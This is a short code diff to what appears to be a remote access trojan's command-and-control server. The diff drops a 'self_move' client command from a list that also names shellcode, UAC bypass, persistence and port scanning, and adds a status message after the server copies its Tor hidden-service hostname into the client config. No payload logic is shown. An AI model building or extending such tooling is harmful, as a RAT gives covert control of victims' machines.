@@ -159,7 +159,6 @@ CLIENT_COMMANDS = [
     "shellcode",
     "uac",
     "persist",
-    "self_move",
     "check_elevated",
     "self_uac",
     "portscan",
@@ -670,6 +669,7 @@ def run_c2_server():
         write_hostname(hostname)
     except:
         os.system("sudo cat /var/lib/tor/art1rat/hostname > artirat-client/config/hostname")
+        print("[*] Copied Hidden Service Hostname")
         
     print()
     c2_menu(manager)
